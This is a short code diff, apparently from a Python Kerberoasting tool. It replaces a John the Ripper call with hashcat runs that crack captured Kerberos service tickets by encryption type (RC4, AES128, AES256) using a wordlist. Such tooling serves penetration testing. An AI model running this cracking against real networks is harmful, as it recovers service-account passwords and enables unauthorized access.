@@ -547,8 +547,15 @@ if __name__ == "__main__":
         logger.info("Finished all domains")
 
         if options.crack is not None:
-            print("Starting to crack using wordlist: "+options.crack)
-            subprocess.run(["john","--format:krb5tgs",options.outputfile,"--wordlist="+options.crack]).stdout
+            if os.path.exists(options.outputfile+".23.krb5tgs"):
+                print("Starting to crack RC4 tickets using wordlist: "+options.crack)
+                subprocess.run(["hashcat","-m13100","-a0",options.outputfile+".23.krb5tgs",options.crack,"--force"]).stdout
+            if os.path.exists(options.outputfile+".17.krb5tgs"):
+                print("Starting to crack AES128 encrypted tickets using wordlist: "+options.crack)
+                subprocess.run(["hashcat","-m19600","-a0",options.outputfile+".17.krb5tgs",options.crack,"--force"]).stdout
+            if os.path.exists(options.outputfile+".18.krb5tgs"):
+                print("Starting to crack AES256 encrypted tickets using wordlist: "+options.crack)
+                subprocess.run(["hashcat","-m19700","-a0",options.outputfile+".18.krb5tgs",options.crack,"--force"]).stdout
 
     except Exception as e:
         import traceback
